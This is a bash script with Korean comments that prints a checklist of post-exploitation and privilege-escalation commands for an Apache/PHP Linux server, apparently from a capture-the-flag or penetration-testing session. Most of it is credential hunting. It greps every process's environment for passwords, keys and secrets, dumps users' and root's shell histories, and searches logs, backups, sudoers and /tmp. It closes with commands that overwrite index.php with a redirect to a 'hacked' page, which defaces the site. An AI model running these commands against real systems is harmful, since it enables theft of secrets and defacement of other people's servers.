#!/bin/bash
echo "============================================================"
echo "🎯 창의적인 권한 상승 방법들"
echo "============================================================"
echo ""

echo "방법 1: Apache 설정 파일에서 정보 찾기"
echo "------------------------------------------------------------"
cat << 'EOF'
# Apache 설정 파일 위치 찾기
find /etc -name "httpd.conf" -o -name "apache2.conf" 2>/dev/null

# SELinux 때문에 읽기 어려울 수 있음
cat /etc/httpd/conf/httpd.conf 2>/dev/null | grep -i "user\|group"

# PHP 설정에 뭔가 있을 수도
cat /etc/php.ini 2>/dev/null | head -50
EOF
echo ""

echo "방법 2: /var/www/html 소유권 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
ls -la /var/www/html/

# 만약 apache 그룹이 쓰기 권한을 가지고 있다면?
ls -ld /var/www/html/
# drwxrwxr-x apache apache 같은 식이면 가능!
EOF
echo ""

echo "방법 3: 환경변수에서 비밀번호 찾기"
echo "------------------------------------------------------------"
cat << 'EOF'
env | grep -i pass
cat /proc/self/environ | tr '\0' '\n' | grep -i pass

# 다른 프로세스 환경변수도 확인
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret"
done | head -20
EOF
echo ""

echo "방법 4: 히스토리 파일 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
cat ~/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
find /home -name ".bash_history" -exec cat {} \; 2>/dev/null
EOF
echo ""

echo "방법 5: 로그 파일에서 자격증명 찾기"
echo "------------------------------------------------------------"
cat << 'EOF'
# Apache 로그에 민감 정보가 있을 수도
cat /var/log/httpd/access_log 2>/dev/null | grep -i "pass\|key" | tail -20
cat /var/log/httpd/error_log 2>/dev/null | grep -i "pass\|key" | tail -20

# MySQL 로그
cat /var/log/mysql/*.log 2>/dev/null | grep -i "pass" | tail -20
EOF
echo ""

echo "방법 6: 백업 파일 찾기"
echo "------------------------------------------------------------"
cat << 'EOF'
find /var/www/html -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
find /var/www/html -name "*config*" 2>/dev/null

# 숨겨진 파일들
ls -la /var/www/html/ | grep "^\."
find /var/www/html -name ".*" 2>/dev/null
EOF
echo ""

echo "방법 7: 실행 중인 프로세스 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
ps aux | grep root
ps aux | grep mysql

# MySQL이 root로 실행 중이면?
ps aux | grep mysql | grep root
EOF
echo ""

echo "방법 8: NFS/SAMBA 공유 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null
EOF
echo ""

echo "방법 9: 잘못 설정된 sudo 규칙"
echo "------------------------------------------------------------"
cat << 'EOF'
# sudoers 파일 읽기 (보통 안 되지만)
cat /etc/sudoers 2>/dev/null

# sudoers.d 디렉토리
ls -la /etc/sudoers.d/ 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null
EOF
echo ""

echo "방법 10: systemd 서비스 파일 확인"
echo "------------------------------------------------------------"
cat << 'EOF'
# 웹 서버 서비스 파일
cat /usr/lib/systemd/system/httpd.service 2>/dev/null
cat /usr/lib/systemd/system/mariadb.service 2>/dev/null

# 커스텀 서비스가 있을 수도
ls -la /etc/systemd/system/ 2>/dev/null
EOF
echo ""

echo "============================================================"
echo "방법 11: pspy로 백그라운드 프로세스 감시 (제일 강력)"
echo "============================================================"
cat << 'EOF'
# pspy64 다운로드 (공격자 서버에서)
# 그럼 못쓰네... 패스

# 대신 직접 감시
while true; do
    ps aux | grep -v grep | grep root;
    sleep 2;
done
EOF
echo ""

echo "============================================================"
echo "방법 12: /tmp, /var/tmp에 남은 파일들"
echo "============================================================"
cat << 'EOF'
ls -la /tmp/
ls -la /var/tmp/

# 다른 사람이 남긴 스크립트나 데이터
cat /tmp/* 2>/dev/null
cat /var/tmp/* 2>/dev/null
EOF
echo ""

echo "============================================================"
echo "🎯 현실적인 마지막 시도"
echo "============================================================"
echo ""
echo "Apache가 /var/www/html에 쓰기 권한이 있는지 확인:"
cat << 'TEST'
# 테스트 파일 작성 시도
echo "test" > /var/www/html/test.txt 2>&1
ls -la /var/www/html/test.txt
rm /var/www/html/test.txt 2>/dev/null

# 만약 성공한다면?
echo '<?php header("Location: /hacked.html"); exit; ?>' > /var/www/html/index.php

# 그럼 바로 완성!
TEST
echo ""

echo "============================================================"
echo "마지막 희망: index.php 덮어쓰기 가능 여부"
echo "============================================================"
cat << 'FINAL'
# 현재 index.php 권한 확인
ls -la /var/www/html/index.php

# apache 그룹에 쓰기 권한이 있나?
# -rw-rw-r-- 1 root apache 같으면 가능!

# 시도해보기
echo 'TEST' >> /var/www/html/index.php 2>&1
FINAL
echo ""

echo "============================================================"
